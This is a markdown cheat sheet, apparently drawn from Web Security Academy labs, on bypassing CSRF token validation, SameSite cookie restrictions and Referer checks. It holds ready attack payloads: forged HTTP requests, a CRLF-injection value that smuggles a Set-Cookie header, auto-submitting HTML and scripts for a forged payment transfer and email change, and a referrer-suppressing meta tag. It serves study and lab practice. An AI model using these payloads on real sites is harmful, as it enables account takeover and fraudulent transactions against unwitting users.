# Content
- [Bypassing CSRF token validation](#bypassing-csrf-token-validation)
  - [Validation of CSRF token depends on request method](#validation-of-csrf-token-depends-on-request-method)
  - [Validation of CSRF token depends on token being present](#validation-of-csrf-token-depends-on-token-being-present)
  - [CSRF token is not tied to the user session](#csrf-token-is-not-tied-to-the-user-session)
  - [CSRF token is tied to a non-session cookie](#csrf-token-is-tied-to-a-non-session-cookie)
  - [CSRF token is tied to a length](#csrf-token-is-tied-to-a-length)
  - [CSRF token is simply duplicated in a cookie](#csrf-token-is-simply-duplicated-in-a-cookie)
# Bypassing CSRF token validation

### Validation of CSRF token depends on request method

try diffrent methods

### Validation of CSRF token depends on token being present

remove paramter

### CSRF token is not tied to the user session

obtain a token and use it

### CSRF token is tied to a non-session cookie
- If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. 
- The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 
- The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. Any other application within the same overall DNS domain can potentially be leveraged

EX:
```
POST /email/change HTTP/1.1  
Host: vulnerable-website.com  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 68  
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv  
  
csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

### CSRF token is tied to a length
- change a char

use crlf injection EX :

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```


### CSRF token is simply duplicated in a cookie

- some applications do not maintain any server-side record of tokens that have been issued

- the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie-but

- instead duplicate each token within a cookie and a request parameter.

EX:
```
POST /email/change HTTP/1.1  
Host: vulnerable-website.com  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 68  
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa  
  
csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```



# Bypassing SameSite cookie restrictions

### Bypassing SameSite Lax restrictions using GET requests

- craft get link
```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

- method override


for example Symfony supports the _method parameter 
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

### Bypassing SameSite restrictions using on-site gadgets (Strict , Lax )

- find a gadget that results in a secondary request within the same site

EX : DOM-based open redirection.

```html
<script>  
document.location =```https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?  
postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1```;  
</script>
```


### Bypassing SameSite restrictions via vulnerable sibling domains

-xss

-Cross-site WebSocket hijacking


# Bypassing Referer-based CSRF defenses

### Validation of Referer depends on header being present

 HTML page that hosts the CSRF attack contain:  
```html
<meta name="referrer" content="never">
```
